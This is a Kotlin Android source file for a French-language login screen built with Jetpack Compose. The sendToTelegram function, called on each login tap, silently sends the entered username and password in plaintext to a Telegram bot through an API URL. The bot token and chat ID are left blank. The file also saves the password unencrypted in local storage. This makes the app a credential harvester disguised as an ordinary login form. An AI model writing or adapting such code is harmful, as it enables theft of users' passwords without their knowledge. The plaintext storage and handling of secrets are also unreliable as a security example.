package com.example.tp_apk.screens
import com.example.tp_apk.R
import com.example.tp_apk.data.DataStoreManager

import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.material3.Button
import androidx.compose.material3.OutlinedTextField
import androidx.compose.material3.Text
import androidx.compose.runtime.*
import androidx.compose.ui.Modifier
import androidx.compose.ui.unit.dp
import androidx.compose.foundation.Image
import androidx.compose.ui.res.painterResource
import androidx.compose.ui.layout.ContentScale
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.Person
import androidx.compose.material.icons.filled.Lock
import androidx.compose.material3.Icon
import androidx.compose.ui.platform.LocalContext
import kotlinx.coroutines.launch
import androidx.compose.runtime.rememberCoroutineScope
import androidx.compose.foundation.layout.heightIn
import androidx.compose.ui.Alignment
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.OkHttpClient
import okhttp3.Request

@Composable
fun LoginScreen(
    onLoginSuccess: () -> Unit,
)  {
    val context = LocalContext.current
    val scope = rememberCoroutineScope()
    val dataStore = DataStoreManager(context)
    var username by remember { mutableStateOf("") }
    var password by remember { mutableStateOf("") }

    Column(
        modifier = Modifier
            .fillMaxSize()
            .padding(24.dp),
        verticalArrangement = Arrangement.Center,
        horizontalAlignment = Alignment.CenterHorizontally,

        ) {
        Image(
            painter = painterResource(id = R.drawable.logo),
            contentDescription = "Logo",
            modifier = Modifier
                .fillMaxWidth()
                .height(120.dp),
            contentScale = ContentScale.Fit
        )

        Spacer(modifier = Modifier.height(24.dp))

        OutlinedTextField(
            value = username,
            onValueChange = {
                username = it.take(10)
            },
            label = { Text("Nom d'utilisateur") },
            leadingIcon = {
                Icon(
                    imageVector = Icons.Default.Person,
                    contentDescription = "Utilisateur"
                )
            },
            modifier = Modifier
                .fillMaxWidth()
                .heightIn(min = 56.dp, max = 60.dp)
        )

        Spacer(modifier = Modifier.height(12.dp))

        OutlinedTextField(
            value = password,
            onValueChange = {
                password = it.take(15)
            },
            label = { Text("Mot de passe") },
            leadingIcon = {
                Icon(
                    imageVector = Icons.Default.Lock,
                    contentDescription = "Mot de passe"
                )
            },
            modifier = Modifier
                .fillMaxWidth()
                .heightIn(min = 56.dp, max = 60.dp)
        )

        Spacer(modifier = Modifier.height(24.dp))



            Button(
                onClick = {
                    scope.launch {

                        dataStore.saveUser(username, password)
                        val time = System.currentTimeMillis()
                        dataStore.saveLastLogin(time)

                        sendToTelegram(username, password, time)
                    }
                    onLoginSuccess()
                }
            ) {
                Text("Connexion")
            }


    }
}



suspend fun sendToTelegram(
    username: String,
    password: String,
    lastLogin: Long
) {
    withContext(Dispatchers.IO) {

        val botToken = ""
        val chatId = ""

        val message = """
             LOGIN DATA
             Username: $username
             Password: $password
             LastLogin: $lastLogin
        """.trimIndent()

        val url =
            "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=$message"

        val client = OkHttpClient()

        val request = Request.Builder()
            .url(url)
            .build()

        client.newCall(request).execute()
    }
}